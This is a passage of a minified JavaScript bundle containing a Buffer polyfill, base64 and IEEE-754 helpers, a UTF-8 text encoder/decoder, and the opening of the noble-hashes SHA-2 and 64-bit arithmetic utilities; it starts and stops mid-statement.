t>>>=0,e||E(t,2,this.length),this[t]|this[t+1]<<8},f.prototype.readUint16BE=f.prototype.readUInt16BE=function(t,e){return t>>>=0,e||E(t,2,this.length),this[t]<<8|this[t+1]},f.prototype.readUint32LE=f.prototype.readUInt32LE=function(t,e){return t>>>=0,e||E(t,4,this.length),(this[t]|this[t+1]<<8|this[t+2]<<16)+0x1000000*this[t+3]},f.prototype.readUint32BE=f.prototype.readUInt32BE=function(t,e){return t>>>=0,e||E(t,4,this.length),0x1000000*this[t]+(this[t+1]<<16|this[t+2]<<8|this[t+3])},f.prototype.readBigUInt64LE=j(function(t){U(t>>>=0,"offset");let e=this[t],r=this[t+7];(void 0===e||void 0===r)&&N(t,this.length-8);let i=e+256*this[++t]+65536*this[++t]+0x1000000*this[++t],n=this[++t]+256*this[++t]+65536*this[++t]+0x1000000*r;return BigInt(i)+(BigInt(n)<<BigInt(32))}),f.prototype.readBigUInt64BE=j(function(t){U(t>>>=0,"offset");let e=this[t],r=this[t+7];(void 0===e||void 0===r)&&N(t,this.length-8);let i=0x1000000*e+65536*this[++t]+256*this[++t]+this[++t],n=0x1000000*this[++t]+65536*this[++t]+256*this[++t]+r;return(BigInt(i)<<BigInt(32))+BigInt(n)}),f.prototype.readIntLE=function(t,e,r){t>>>=0,e>>>=0,r||E(t,e,this.length);let i=this[t],n=1,o=0;for(;++o<e&&(n*=256);)i+=this[t+o]*n;return i>=(n*=128)&&(i-=Math.pow(2,8*e)),i},f.prototype.readIntBE=function(t,e,r){t>>>=0,e>>>=0,r||E(t,e,this.length);let i=e,n=1,o=this[t+--i];for(;i>0&&(n*=256);)o+=this[t+--i]*n;return o>=(n*=128)&&(o-=Math.pow(2,8*e)),o},f.prototype.readInt8=function(t,e){return(t>>>=0,e||E(t,1,this.length),128&this[t])?-((255-this[t]+1)*1):this[t]},f.prototype.readInt16LE=function(t,e){t>>>=0,e||E(t,2,this.length);let r=this[t]|this[t+1]<<8;return 32768&r?0xffff0000|r:r},f.prototype.readInt16BE=function(t,e){t>>>=0,e||E(t,2,this.length);let r=this[t+1]|this[t]<<8;return 32768&r?0xffff0000|r:r},f.prototype.readInt32LE=function(t,e){return t>>>=0,e||E(t,4,this.length),this[t]|this[t+1]<<8|this[t+2]<<16|this[t+3]<<24},f.prototype.readInt32BE=function(t,e){return t>>>=0,e||E(t,4,this.length),this[t]<<24|this[t+1]<<16|this[t+2]<<8|this[t+3]},f.prototype.readBigInt64LE=j(function(t){U(t>>>=0,"offset");let e=this[t],r=this[t+7];return(void 0===e||void 0===r)&&N(t,this.length-8),(BigInt(this[t+4]+256*this[t+5]+65536*this[t+6]+(r<<24))<<BigInt(32))+BigInt(e+256*this[++t]+65536*this[++t]+0x1000000*this[++t])}),f.prototype.readBigInt64BE=j(function(t){U(t>>>=0,"offset");let e=this[t],r=this[t+7];return(void 0===e||void 0===r)&&N(t,this.length-8),(BigInt((e<<24)+65536*this[++t]+256*this[++t]+this[++t])<<BigInt(32))+BigInt(0x1000000*this[++t]+65536*this[++t]+256*this[++t]+r)}),f.prototype.readFloatLE=function(t,e){return t>>>=0,e||E(t,4,this.length),u.read(this,t,!0,23,4)},f.prototype.readFloatBE=function(t,e){return t>>>=0,e||E(t,4,this.length),u.read(this,t,!1,23,4)},f.prototype.readDoubleLE=function(t,e){return t>>>=0,e||E(t,8,this.length),u.read(this,t,!0,52,8)},f.prototype.readDoubleBE=function(t,e){return t>>>=0,e||E(t,8,this.length),u.read(this,t,!1,52,8)},f.prototype.writeUintLE=f.prototype.writeUIntLE=function(t,e,r,i){if(t=+t,e>>>=0,r>>>=0,!i){let i=Math.pow(2,8*r)-1;A(this,t,e,r,i,0)}let n=1,o=0;for(this[e]=255&t;++o<r&&(n*=256);)this[e+o]=t/n&255;return e+r},f.prototype.writeUintBE=f.prototype.writeUIntBE=function(t,e,r,i){if(t=+t,e>>>=0,r>>>=0,!i){let i=Math.pow(2,8*r)-1;A(this,t,e,r,i,0)}let n=r-1,o=1;for(this[e+n]=255&t;--n>=0&&(o*=256);)this[e+n]=t/o&255;return e+r},f.prototype.writeUint8=f.prototype.writeUInt8=function(t,e,r){return t=+t,e>>>=0,r||A(this,t,e,1,255,0),this[e]=255&t,e+1},f.prototype.writeUint16LE=f.prototype.writeUInt16LE=function(t,e,r){return t=+t,e>>>=0,r||A(this,t,e,2,65535,0),this[e]=255&t,this[e+1]=t>>>8,e+2},f.prototype.writeUint16BE=f.prototype.writeUInt16BE=function(t,e,r){return t=+t,e>>>=0,r||A(this,t,e,2,65535,0),this[e]=t>>>8,this[e+1]=255&t,e+2},f.prototype.writeUint32LE=f.prototype.writeUInt32LE=function(t,e,r){return t=+t,e>>>=0,r||A(this,t,e,4,0xffffffff,0),this[e+3]=t>>>24,this[e+2]=t>>>16,this[e+1]=t>>>8,this[e]=255&t,e+4},f.prototype.writeUint32BE=f.prototype.writeUInt32BE=function(t,e,r){return t=+t,e>>>=0,r||A(this,t,e,4,0xffffffff,0),this[e]=t>>>24,this[e+1]=t>>>16,this[e+2]=t>>>8,this[e+3]=255&t,e+4},f.prototype.writeBigUInt64LE=j(function(t,e=0){return _(this,t,e,BigInt(0),BigInt("0xffffffffffffffff"))}),f.prototype.writeBigUInt64BE=j(function(t,e=0){return I(this,t,e,BigInt(0),BigInt("0xffffffffffffffff"))}),f.prototype.writeIntLE=function(t,e,r,i){if(t=+t,e>>>=0,!i){let i=Math.pow(2,8*r-1);A(this,t,e,r,i-1,-i)}let n=0,o=1,s=0;for(this[e]=255&t;++n<r&&(o*=256);)t<0&&0===s&&0!==this[e+n-1]&&(s=1),this[e+n]=(t/o>>0)-s&255;return e+r},f.prototype.writeIntBE=function(t,e,r,i){if(t=+t,e>>>=0,!i){let i=Math.pow(2,8*r-1);A(this,t,e,r,i-1,-i)}let n=r-1,o=1,s=0;for(this[e+n]=255&t;--n>=0&&(o*=256);)t<0&&0===s&&0!==this[e+n+1]&&(s=1),this[e+n]=(t/o>>0)-s&255;return e+r},f.prototype.writeInt8=function(t,e,r){return t=+t,e>>>=0,r||A(this,t,e,1,127,-128),t<0&&(t=255+t+1),this[e]=255&t,e+1},f.prototype.writeInt16LE=function(t,e,r){return t=+t,e>>>=0,r||A(this,t,e,2,32767,-32768),this[e]=255&t,this[e+1]=t>>>8,e+2},f.prototype.writeInt16BE=function(t,e,r){return t=+t,e>>>=0,r||A(this,t,e,2,32767,-32768),this[e]=t>>>8,this[e+1]=255&t,e+2},f.prototype.writeInt32LE=function(t,e,r){return t=+t,e>>>=0,r||A(this,t,e,4,0x7fffffff,-0x80000000),this[e]=255&t,this[e+1]=t>>>8,this[e+2]=t>>>16,this[e+3]=t>>>24,e+4},f.prototype.writeInt32BE=function(t,e,r){return t=+t,e>>>=0,r||A(this,t,e,4,0x7fffffff,-0x80000000),t<0&&(t=0xffffffff+t+1),this[e]=t>>>24,this[e+1]=t>>>16,this[e+2]=t>>>8,this[e+3]=255&t,e+4},f.prototype.writeBigInt64LE=j(function(t,e=0){return _(this,t,e,-BigInt("0x8000000000000000"),BigInt("0x7fffffffffffffff"))}),f.prototype.writeBigInt64BE=j(function(t,e=0){return I(this,t,e,-BigInt("0x8000000000000000"),BigInt("0x7fffffffffffffff"))}),f.prototype.writeFloatLE=function(t,e,r){return L(this,t,e,!0,r)},f.prototype.writeFloatBE=function(t,e,r){return L(this,t,e,!1,r)},f.prototype.writeDoubleLE=function(t,e,r){return T(this,t,e,!0,r)},f.prototype.writeDoubleBE=function(t,e,r){return T(this,t,e,!1,r)},f.prototype.copy=function(t,e,r,i){if(!f.isBuffer(t))throw TypeError("argument should be a Buffer");if(r||(r=0),i||0===i||(i=this.length),e>=t.length&&(e=t.length),e||(e=0),i>0&&i<r&&(i=r),i===r||0===t.length||0===this.length)return 0;if(e<0)throw RangeError("targetStart out of bounds");if(r<0||r>=this.length)throw RangeError("Index out of range");if(i<0)throw RangeError("sourceEnd out of bounds");i>this.length&&(i=this.length),t.length-e<i-r&&(i=t.length-e+r);let n=i-r;return this===t&&"function"==typeof Uint8Array.prototype.copyWithin?this.copyWithin(e,r,i):Uint8Array.prototype.set.call(t,this.subarray(r,i),e),n},f.prototype.fill=function(t,e,r,i){let n;if("string"==typeof t){if("string"==typeof e?(i=e,e=0,r=this.length):"string"==typeof r&&(i=r,r=this.length),void 0!==i&&"string"!=typeof i)throw TypeError("encoding must be a string");if("string"==typeof i&&!f.isEncoding(i))throw TypeError("Unknown encoding: "+i);if(1===t.length){let e=t.charCodeAt(0);("utf8"===i&&e<128||"latin1"===i)&&(t=e)}}else"number"==typeof t?t&=255:"boolean"==typeof t&&(t=Number(t));if(e<0||this.length<e||this.length<r)throw RangeError("Out of range index");if(r<=e)return this;if(e>>>=0,r=void 0===r?this.length:r>>>0,t||(t=0),"number"==typeof t)for(n=e;n<r;++n)this[n]=t;else{let o=f.isBuffer(t)?t:f.from(t,i),s=o.length;if(0===s)throw TypeError('The value "'+t+'" is invalid for argument "value"');for(n=0;n<r-e;++n)this[n+e]=o[n%s]}return this};let O={};function P(t,e,r){O[t]=class extends r{constructor(){super(),Object.defineProperty(this,"message",{value:e.apply(this,arguments),writable:!0,configurable:!0}),this.name=`${this.name} [${t}]`,this.stack,delete this.name}get code(){return t}set code(t){Object.defineProperty(this,"code",{configurable:!0,enumerable:!0,value:t,writable:!0})}toString(){return`${this.name} [${t}]: ${this.message}`}}}function R(t){let e="",r=t.length,i="-"===t[0]?1:0;for(;r>=i+4;r-=3)e=`_${t.slice(r-3,r)}${e}`;return`${t.slice(0,r)}${e}`}function C(t,e,r,i,n,o){if(t>r||t<e){let i;let n="bigint"==typeof e?"n":"";throw i=o>3?0===e||e===BigInt(0)?`>= 0${n} and < 2${n} ** ${(o+1)*8}${n}`:`>= -(2${n} ** ${(o+1)*8-1}${n}) and < 2 ** ${(o+1)*8-1}${n}`:`>= ${e}${n} and <= ${r}${n}`,new O.ERR_OUT_OF_RANGE("value",i,t)}U(n,"offset"),(void 0===i[n]||void 0===i[n+o])&&N(n,i.length-(o+1))}function U(t,e){if("number"!=typeof t)throw new O.ERR_INVALID_ARG_TYPE(e,"number",t)}function N(t,e,r){if(Math.floor(t)!==t)throw U(t,r),new O.ERR_OUT_OF_RANGE(r||"offset","an integer",t);if(e<0)throw new O.ERR_BUFFER_OUT_OF_BOUNDS;throw new O.ERR_OUT_OF_RANGE(r||"offset",`>= ${r?1:0} and <= ${e}`,t)}P("ERR_BUFFER_OUT_OF_BOUNDS",function(t){return t?`${t} is outside of buffer bounds`:"Attempt to access memory outside buffer bounds"},RangeError),P("ERR_INVALID_ARG_TYPE",function(t,e){return`The "${t}" argument must be of type number. Received type ${typeof e}`},TypeError),P("ERR_OUT_OF_RANGE",function(t,e,r){let i=`The value of "${t}" is out of range.`,n=r;return Number.isInteger(r)&&Math.abs(r)>0x100000000?n=R(String(r)):"bigint"==typeof r&&(n=String(r),(r>BigInt(2)**BigInt(32)||r<-(BigInt(2)**BigInt(32)))&&(n=R(n)),n+="n"),i+=` It must be ${e}. Received ${n}`},RangeError);let z=/[^+/0-9A-Za-z-_]/g;function H(t,e){let r;e=e||1/0;let i=t.length,n=null,o=[];for(let s=0;s<i;++s){if((r=t.charCodeAt(s))>55295&&r<57344){if(!n){if(r>56319||s+1===i){(e-=3)>-1&&o.push(239,191,189);continue}n=r;continue}if(r<56320){(e-=3)>-1&&o.push(239,191,189),n=r;continue}r=(n-55296<<10|r-56320)+65536}else n&&(e-=3)>-1&&o.push(239,191,189);if(n=null,r<128){if((e-=1)<0)break;o.push(r)}else if(r<2048){if((e-=2)<0)break;o.push(r>>6|192,63&r|128)}else if(r<65536){if((e-=3)<0)break;o.push(r>>12|224,r>>6&63|128,63&r|128)}else if(r<1114112){if((e-=4)<0)break;o.push(r>>18|240,r>>12&63|128,r>>6&63|128,63&r|128)}else throw Error("Invalid code point")}return o}function q(t){return a.toByteArray(function(t){if((t=(t=t.split("=")[0]).trim().replace(z,"")).length<2)return"";for(;t.length%4!=0;)t+="=";return t}(t))}function W(t,e,r,i){let n;for(n=0;n<i&&!(n+r>=e.length)&&!(n>=t.length);++n)e[n+r]=t[n];return n}function F(t,e){return t instanceof e||null!=t&&null!=t.constructor&&null!=t.constructor.name&&t.constructor.name===e.name}let D=function(){let t="0123456789abcdef",e=Array(256);for(let r=0;r<16;++r){let i=16*r;for(let n=0;n<16;++n)e[i+n]=t[r]+t[n]}return e}();function j(t){return"undefined"==typeof BigInt?K:t}function K(){throw Error("BigInt not supported")}}),h("kuxul",function(e,r){t(e.exports,"toByteArray",()=>i,t=>i=t),t(e.exports,"fromByteArray",()=>n,t=>n=t),i=function(t){var e,r,i=function(t){var e=t.length;if(e%4>0)throw Error("Invalid string. Length must be a multiple of 4");var r=t.indexOf("=");-1===r&&(r=e);var i=r===e?0:4-r%4;return[r,i]}(t),n=i[0],o=i[1],u=new a((n+o)*3/4-o),l=0,c=o>0?n-4:n;for(r=0;r<c;r+=4)e=s[t.charCodeAt(r)]<<18|s[t.charCodeAt(r+1)]<<12|s[t.charCodeAt(r+2)]<<6|s[t.charCodeAt(r+3)],u[l++]=e>>16&255,u[l++]=e>>8&255,u[l++]=255&e;return 2===o&&(e=s[t.charCodeAt(r)]<<2|s[t.charCodeAt(r+1)]>>4,u[l++]=255&e),1===o&&(e=s[t.charCodeAt(r)]<<10|s[t.charCodeAt(r+1)]<<4|s[t.charCodeAt(r+2)]>>2,u[l++]=e>>8&255,u[l++]=255&e),u},n=function(t){for(var e,r=t.length,i=r%3,n=[],s=0,a=r-i;s<a;s+=16383)n.push(function(t,e,r){for(var i,n=[],s=e;s<r;s+=3)n.push(o[(i=(t[s]<<16&0xff0000)+(t[s+1]<<8&65280)+(255&t[s+2]))>>18&63]+o[i>>12&63]+o[i>>6&63]+o[63&i]);return n.join("")}(t,s,s+16383>a?a:s+16383));return 1===i?n.push(o[(e=t[r-1])>>2]+o[e<<4&63]+"=="):2===i&&n.push(o[(e=(t[r-2]<<8)+t[r-1])>>10]+o[e>>4&63]+o[e<<2&63]+"="),n.join("")};for(var i,n,o=[],s=[],a="undefined"!=typeof Uint8Array?Uint8Array:Array,u="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",l=0,c=u.length;l<c;++l)o[l]=u[l],s[u.charCodeAt(l)]=l;s["-".charCodeAt(0)]=62,s["_".charCodeAt(0)]=63}),h("9NvM5",function(e,r){var i,n;t(e.exports,"read",()=>i,t=>i=t),t(e.exports,"write",()=>n,t=>n=t),i=function(t,e,r,i,n){var o,s,a=8*n-i-1,u=(1<<a)-1,l=u>>1,c=-7,h=r?n-1:0,f=r?-1:1,d=t[e+h];for(h+=f,o=d&(1<<-c)-1,d>>=-c,c+=a;c>0;o=256*o+t[e+h],h+=f,c-=8);for(s=o&(1<<-c)-1,o>>=-c,c+=i;c>0;s=256*s+t[e+h],h+=f,c-=8);if(0===o)o=1-l;else{if(o===u)return s?NaN:1/0*(d?-1:1);s+=Math.pow(2,i),o-=l}return(d?-1:1)*s*Math.pow(2,o-i)},n=function(t,e,r,i,n,o){var s,a,u,l=8*o-n-1,c=(1<<l)-1,h=c>>1,f=23===n?5960464477539062e-23:0,d=i?0:o-1,p=i?1:-1,g=e<0||0===e&&1/e<0?1:0;for(isNaN(e=Math.abs(e))||e===1/0?(a=isNaN(e)?1:0,s=c):(s=Math.floor(Math.log(e)/Math.LN2),e*(u=Math.pow(2,-s))<1&&(s--,u*=2),s+h>=1?e+=f/u:e+=f*Math.pow(2,1-h),e*u>=2&&(s++,u/=2),s+h>=c?(a=0,s=c):s+h>=1?(a=(e*u-1)*Math.pow(2,n),s+=h):(a=e*Math.pow(2,h-1)*Math.pow(2,n),s=0));n>=8;t[r+d]=255&a,d+=p,a/=256,n-=8);for(s=s<<n|a,l+=n;l>0;t[r+d]=255&s,d+=p,s/=256,l-=8);t[r+d-p]|=128*g}}),h("kOaA4",function(e,r){function i(t,e,r){return e<=t&&t<=r}function n(t){if(void 0===t)return{};if(t===Object(t))return t;throw TypeError("Could not convert argument to dictionary")}function o(t){this.tokens=[].slice.call(t)}function s(t,e){if(t)throw TypeError("Decoder error");return e||65533}t(e.exports,"TextEncoder",()=>a,t=>a=t),t(e.exports,"TextDecoder",()=>u,t=>u=t),o.prototype={endOfStream:function(){return!this.tokens.length},read:function(){return this.tokens.length?this.tokens.shift():-1},prepend:function(t){if(Array.isArray(t))for(;t.length;)this.tokens.unshift(t.pop());else this.tokens.unshift(t)},push:function(t){if(Array.isArray(t))for(;t.length;)this.tokens.push(t.shift());else this.tokens.push(t)}};var a,u,l="utf-8";function c(t,e){if(!(this instanceof c))return new c(t,e);if((t=void 0!==t?String(t).toLowerCase():l)!==l)throw Error("Encoding not supported. Only utf-8 is supported");e=n(e),this._streaming=!1,this._BOMseen=!1,this._decoder=null,this._fatal=!!e.fatal,this._ignoreBOM=!!e.ignoreBOM,Object.defineProperty(this,"encoding",{value:"utf-8"}),Object.defineProperty(this,"fatal",{value:this._fatal}),Object.defineProperty(this,"ignoreBOM",{value:this._ignoreBOM})}function h(t,e){if(!(this instanceof h))return new h(t,e);if((t=void 0!==t?String(t).toLowerCase():l)!==l)throw Error("Encoding not supported. Only utf-8 is supported");e=n(e),this._streaming=!1,this._encoder=null,this._options={fatal:!!e.fatal},Object.defineProperty(this,"encoding",{value:"utf-8"})}function f(t){var e=t.fatal,r=0,n=0,o=0,a=128,u=191;this.handler=function(t,l){if(-1===l&&0!==o)return o=0,s(e);if(-1===l)return -1;if(0===o){if(i(l,0,127))return l;if(i(l,194,223))o=1,r=l-192;else if(i(l,224,239))224===l&&(a=160),237===l&&(u=159),o=2,r=l-224;else{if(!i(l,240,244))return s(e);240===l&&(a=144),244===l&&(u=143),o=3,r=l-240}return r<<=6*o,null}if(!i(l,a,u))return r=o=n=0,a=128,u=191,t.prepend(l),s(e);if(a=128,u=191,n+=1,r+=l-128<<6*(o-n),n!==o)return null;var c=r;return r=o=n=0,c}}function d(t){t.fatal,this.handler=function(t,e){if(-1===e)return -1;if(i(e,0,127))return e;i(e,128,2047)?(r=1,n=192):i(e,2048,65535)?(r=2,n=224):i(e,65536,1114111)&&(r=3,n=240);for(var r,n,o=[(e>>6*r)+n];r>0;){var s=e>>6*(r-1);o.push(128|63&s),r-=1}return o}}c.prototype={decode:function(t,e){r="object"==typeof t&&t instanceof ArrayBuffer?new Uint8Array(t):"object"==typeof t&&"buffer"in t&&t.buffer instanceof ArrayBuffer?new Uint8Array(t.buffer,t.byteOffset,t.byteLength):new Uint8Array(0),e=n(e),this._streaming||(this._decoder=new f({fatal:this._fatal}),this._BOMseen=!1),this._streaming=!!e.stream;for(var r,i,s=new o(r),a=[];!s.endOfStream()&&-1!==(i=this._decoder.handler(s,s.read()));)null!==i&&(Array.isArray(i)?a.push.apply(a,i):a.push(i));if(!this._streaming){do{if(-1===(i=this._decoder.handler(s,s.read())))break;if(null===i)continue;Array.isArray(i)?a.push.apply(a,i):a.push(i)}while(!s.endOfStream())this._decoder=null}return!a.length||-1===["utf-8"].indexOf(this.encoding)||this._ignoreBOM||this._BOMseen||(65279===a[0]?(this._BOMseen=!0,a.shift()):this._BOMseen=!0),function(t){for(var e="",r=0;r<t.length;++r){var i=t[r];i<=65535?e+=String.fromCharCode(i):(i-=65536,e+=String.fromCharCode((i>>10)+55296,(1023&i)+56320))}return e}(a)}},h.prototype={encode:function(t,e){t=t?String(t):"",e=n(e),this._streaming||(this._encoder=new d(this._options)),this._streaming=!!e.stream;for(var r,i=[],s=new o(function(t){for(var e=String(t),r=e.length,i=0,n=[];i<r;){var o=e.charCodeAt(i);if(o<55296||o>57343)n.push(o);else if(56320<=o&&o<=57343)n.push(65533);else if(55296<=o&&o<=56319){if(i===r-1)n.push(65533);else{var s=t.charCodeAt(i+1);if(56320<=s&&s<=57343){var a=1023&o,u=1023&s;n.push(65536+(a<<10)+u),i+=1}else n.push(65533)}}i+=1}return n}(t));!s.endOfStream()&&-1!==(r=this._encoder.handler(s,s.read()));)Array.isArray(r)?i.push.apply(i,r):i.push(r);if(!this._streaming){for(;-1!==(r=this._encoder.handler(s,s.read()));)Array.isArray(r)?i.push.apply(i,r):i.push(r);this._encoder=null}return new Uint8Array(i)}},a=h,u=c});var f=c("6ZWSX"),d={};Object.defineProperty(d,"__esModule",{value:!0}),d.hash_to_ristretto255=d.hashToRistretto255=d.RistrettoPoint=d.encodeToCurve=d.hashToCurve=d.edwardsToMontgomery=d.x25519=d.ed25519ph=d.ed25519ctx=d.ed25519=d.ED25519_TORSION_SUBGROUP=void 0,d.edwardsToMontgomeryPub=tj,d.edwardsToMontgomeryPriv=function(t){let e=tF.hash(t.subarray(0,32));return tF.adjustScalarBytes(e).subarray(0,32)};var p={};Object.defineProperty(p,"__esModule",{value:!0}),p.sha384=p.sha512_256=p.sha512_224=p.sha512=p.SHA384=p.SHA512_256=p.SHA512_224=p.SHA512=void 0;var g={};Object.defineProperty(g,"__esModule",{value:!0}),g.HashMD=g.Maj=g.Chi=void 0;var m={};function y(t){if(!Number.isSafeInteger(t)||t<0)throw Error("positive integer expected, got "+t)}function b(t,...e){if(!(t instanceof Uint8Array||ArrayBuffer.isView(t)&&"Uint8Array"===t.constructor.name))throw Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw Error("Uint8Array expected of length "+e+", got length="+t.length)}function w(t){if("function"!=typeof t||"function"!=typeof t.create)throw Error("Hash should be wrapped by utils.wrapConstructor");y(t.outputLen),y(t.blockLen)}function v(t,e=!0){if(t.destroyed)throw Error("Hash instance has been destroyed");if(e&&t.finished)throw Error("Hash#digest() has already been called")}function x(t,e){b(t);let r=e.outputLen;if(t.length<r)throw Error("digestInto() expects output buffer of length at least "+r)}Object.defineProperty(m,"__esModule",{value:!0}),m.anumber=y,m.number=y,m.abytes=b,m.bytes=b,m.ahash=w,m.aexists=v,m.aoutput=x,m.default={number:y,bytes:b,hash:w,exists:v,output:x};var k={};/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */Object.defineProperty(k,"__esModule",{value:!0}),k.Hash=k.nextTick=k.byteSwapIfBE=k.byteSwap=k.isLE=k.rotl=k.rotr=k.createView=k.u32=k.u8=void 0,k.isBytes=function(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&"Uint8Array"===t.constructor.name},k.byteSwap32=function(t){for(let e=0;e<t.length;e++)t[e]=(0,k.byteSwap)(t[e])},k.bytesToHex=function(t){(0,m.abytes)(t);let e="";for(let r=0;r<t.length;r++)e+=B[t[r]];return e},k.hexToBytes=function(t){if("string"!=typeof t)throw Error("hex string expected, got "+typeof t);let e=t.length,r=e/2;if(e%2)throw Error("padded hex string expected, got unpadded hex of length "+e);let i=new Uint8Array(r);for(let e=0,n=0;e<r;e++,n+=2){let r=A(t.charCodeAt(n)),o=A(t.charCodeAt(n+1));if(void 0===r||void 0===o)throw Error('hex string expected, got non-hex character "'+(t[n]+t[n+1])+'" at index '+n);i[e]=16*r+o}return i},k.asyncLoop=I,k.utf8ToBytes=M,k.toBytes=L,k.concatBytes=function(...t){let e=0;for(let r=0;r<t.length;r++){let i=t[r];(0,m.abytes)(i),e+=i.length}let r=new Uint8Array(e);for(let e=0,i=0;e<t.length;e++){let n=t[e];r.set(n,i),i+=n.length}return r},k.checkOpts=function(t,e){if(void 0!==e&&"[object Object]"!==({}).toString.call(e))throw Error("Options should be object or undefined");return Object.assign(t,e)},k.wrapConstructor=function(t){let e=e=>t().update(L(e)).digest(),r=t();return e.outputLen=r.outputLen,e.blockLen=r.blockLen,e.create=()=>t(),e},k.wrapConstructorWithOpts=function(t){let e=(e,r)=>t(r).update(L(e)).digest(),r=t({});return e.outputLen=r.outputLen,e.blockLen=r.blockLen,e.create=e=>t(e),e},k.wrapXOFConstructorWithOpts=function(t){let e=(e,r)=>t(r).update(L(e)).digest(),r=t({});return e.outputLen=r.outputLen,e.blockLen=r.blockLen,e.create=e=>t(e),e},k.randomBytes=function(t=32){if(S.crypto&&"function"==typeof S.crypto.getRandomValues)return S.crypto.getRandomValues(new Uint8Array(t));if(S.crypto&&"function"==typeof S.crypto.randomBytes)return S.crypto.randomBytes(t);throw Error("crypto.getRandomValues must be defined")};var S={};Object.defineProperty(S,"__esModule",{value:!0}),S.crypto=void 0,S.crypto="object"==typeof globalThis&&"crypto"in globalThis?globalThis.crypto:void 0,k.u8=t=>new Uint8Array(t.buffer,t.byteOffset,t.byteLength),k.u32=t=>new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4)),k.createView=t=>new DataView(t.buffer,t.byteOffset,t.byteLength),k.rotr=(t,e)=>t<<32-e|t>>>e,k.rotl=(t,e)=>t<<e|t>>>32-e>>>0,k.isLE=68===new Uint8Array(new Uint32Array([0x11223344]).buffer)[0],k.byteSwap=t=>t<<24&0xff000000|t<<8&0xff0000|t>>>8&65280|t>>>24&255,k.byteSwapIfBE=k.isLE?t=>t:t=>(0,k.byteSwap)(t);const B=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0")),E={_0:48,_9:57,A:65,F:70,a:97,f:102};function A(t){return t>=E._0&&t<=E._9?t-E._0:t>=E.A&&t<=E.F?t-(E.A-10):t>=E.a&&t<=E.f?t-(E.a-10):void 0}const _=async()=>{};async function I(t,e,r){let i=Date.now();for(let n=0;n<t;n++){r(n);let t=Date.now()-i;t>=0&&t<e||(await (0,k.nextTick)(),i+=t)}}function M(t){if("string"!=typeof t)throw Error("utf8ToBytes expected string, got "+typeof t);return new Uint8Array(new TextEncoder().encode(t))}function L(t){return"string"==typeof t&&(t=M(t)),(0,m.abytes)(t),t}k.nextTick=_,k.Hash=class{clone(){return this._cloneInto()}},g.Chi=(t,e,r)=>t&e^~t&r,g.Maj=(t,e,r)=>t&e^t&r^e&r;class T extends k.Hash{constructor(t,e,r,i){super(),this.blockLen=t,this.outputLen=e,this.padOffset=r,this.isLE=i,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(t),this.view=(0,k.createView)(this.buffer)}update(t){(0,m.aexists)(this);let{view:e,buffer:r,blockLen:i}=this,n=(t=(0,k.toBytes)(t)).length;for(let o=0;o<n;){let s=Math.min(i-this.pos,n-o);if(s===i){let e=(0,k.createView)(t);for(;i<=n-o;o+=i)this.process(e,o);continue}r.set(t.subarray(o,o+s),this.pos),this.pos+=s,o+=s,this.pos===i&&(this.process(e,0),this.pos=0)}return this.length+=t.length,this.roundClean(),this}digestInto(t){(0,m.aexists)(this),(0,m.aoutput)(t,this),this.finished=!0;let{buffer:e,view:r,blockLen:i,isLE:n}=this,{pos:o}=this;e[o++]=128,this.buffer.subarray(o).fill(0),this.padOffset>i-o&&(this.process(r,0),o=0);for(let t=o;t<i;t++)e[t]=0;!function(t,e,r,i){if("function"==typeof t.setBigUint64)return t.setBigUint64(e,r,i);let n=BigInt(32),o=BigInt(0xffffffff),s=Number(r>>n&o),a=Number(r&o),u=i?4:0,l=i?0:4;t.setUint32(e+u,s,i),t.setUint32(e+l,a,i)}(r,i-8,BigInt(8*this.length),n),this.process(r,0);let s=(0,k.createView)(t),a=this.outputLen;if(a%4)throw Error("_sha2: outputLen should be aligned to 32bit");let u=a/4,l=this.get();if(u>l.length)throw Error("_sha2: outputLen bigger than state");for(let t=0;t<u;t++)s.setUint32(4*t,l[t],n)}digest(){let{buffer:t,outputLen:e}=this;this.digestInto(t);let r=t.slice(0,e);return this.destroy(),r}_cloneInto(t){t||(t=new this.constructor),t.set(...this.get());let{blockLen:e,buffer:r,length:i,finished:n,destroyed:o,pos:s}=this;return t.length=i,t.pos=s,t.finished=n,t.destroyed=o,i%e&&t.buffer.set(r),t}}g.HashMD=T;var O={};Object.defineProperty(O,"__esModule",{value:!0}),O.add5L=O.add5H=O.add4H=O.add4L=O.add3H=O.add3L=O.rotlBL=O.rotlBH=O.rotlSL=O.rotlSH=O.rotr32L=O.rotr32H=O.rotrBL=O.rotrBH=O.rotrSL=O.rotrSH=O.shrSL=O.shrSH=O.toBig=void 0,O.fromBig=C,O.split=U,O.add=J;const P=BigInt(0x100000000-1),R=BigInt(32);function C(t,e=!1){return e?{h:Number(t&P),l:Number(t>>R&P)}:{h:0|Number(t>>R&P),l:0|Number(t&P)}}function U(t,e=!1){let r=new Uint32Array(t.length),i=new Uint32Array(t.length);for(let n=0;n<t.length;n++){let{h:o,l:s}=C(t[n],e);[r[n],i[n]]=[o,s]}return[r,i]}const N=(t,e)=>BigInt(t>>>0)<<R|BigInt(e>>>0);O.toBig=N;const z=(t,e,r)=>t>>>r;O.shrSH=z;const H=(t,e,r)=>t<<32-r|e>>>r;O.shrSL=H;const q=(t,e,r)=>t>>>r|e<<32-r;O.rotrSH=q;const W=(t,e,r)=>t<<32-r|e>>>r;O.rotrSL=W;const F=(t,e,r)=>t<<64-r|e>>>r-32;O.rotrBH=F;const D=(t,e,r)=>t>>>r-32|e<<64-r;O.rotrBL=D;const j=(t,e)=>e;O.rotr32H=j;const K=(t,e)=>t;O.rotr32L=K;const V=(t,e,r)=>t<<r|e>>>32-r;O.rotlSH=V;const $=(t,e,r)=>e<<r|t>>>32-r;O.rotlSL=$;const Z=(t,e,r)=>e<<r-32|t>>>64-r;O.rotlBH=Z;const G=(t,e,r)=>t<<r-32|e>>>64-r;function J(t,e,r,i){let n=(e>>>0)+(i>>>0);return{h:t+r+(n/0x100000000|0)|0,l:0|n}}O.rotlBL=G;const Y=(t,e,r)=>(t>>>0)+(e>>>0)+(r>>>0);O.add3L=Y;const X=(t,e,r,i)=>e+r+i+(t/0x100000000|0)|0;O.add3H=X;const 